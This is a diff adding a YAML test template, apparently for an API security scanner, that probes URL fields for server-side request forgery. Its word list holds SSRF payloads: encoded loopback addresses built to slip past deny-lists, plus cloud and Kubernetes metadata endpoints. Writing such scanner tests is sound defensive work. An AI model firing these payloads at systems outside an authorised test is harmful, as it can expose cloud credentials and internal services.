@@ -1,0 +1,70 @@
+id: SMART_SSRF_ADDRESS_VARIANTS
+info:
+  name: "SSRF via Alternate Address Encodings and Cloud Metadata Endpoints - Smart Testing"
+  description: "Test URL-valued body and query fields for Server-Side Request Forgery using alternate encodings of internal addresses and cloud or cluster metadata endpoints, which often bypass deny-lists written for 127.0.0.1 and 169.254.169.254. Keep method, headers and auth intact; change one URL field at a time."
+  details: "Replace the URL value with one internal target per probe: loopback in decimal, short or IPv6-mapped form, container or cloud metadata endpoints, or the cluster API address. Proof vs baseline: THIS response contains content from the internal target (metadata keys, credentials document, internal service banner or API version) that the baseline does not, and a control pointing at a non-routable public address does not. A generic error or an unchanged response is NOT vulnerable."
+  impact: "Server-side requests to internal services or metadata endpoints can expose cloud credentials and internal data."
+  category:
+    name: SSRF
+    shortName: Server Side Request Forgery
+    displayName: Server Side Request Forgery (SSRF)
+  subCategory: SMART_SSRF_ADDRESS_VARIANTS
+  severity: HIGH
+  agenticTestingAllowed: true
+  onlySmartTestingAllowed: true
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa7-server-side-request-forgery.md
+    - https://cwe.mitre.org/data/definitions/918.html
+  cwe:
+    - CWE-918
+  cve:
+    - CVE-2021-21311
+
+attributes:
+  nature: INTRUSIVE
+  plan: STANDARD
+  duration: FAST
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    neq: "OPTIONS"
+  or:
+    - request_payload:
+        for_one:
+          value:
+            contains_either:
+              - http
+          key:
+            extract: url_key
+    - query_param:
+        for_one:
+          value:
+            contains_either:
+              - http
+          key:
+            extract: url_key
+
+wordLists:
+  internalTargets:
+    - "http://2130706433/"
+    - "http://127.1/"
+    - "http://[::ffff:127.0.0.1]/"
+    - "http://169.254.170.2/v2/metadata"
+    - "http://metadata.google.internal/computeMetadata/v1/"
+    - "https://kubernetes.default.svc/version"
+
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_query_param:
+            url_key: ${internalTargets}
+        - modify_body_param:
+            url_key: ${internalTargets}
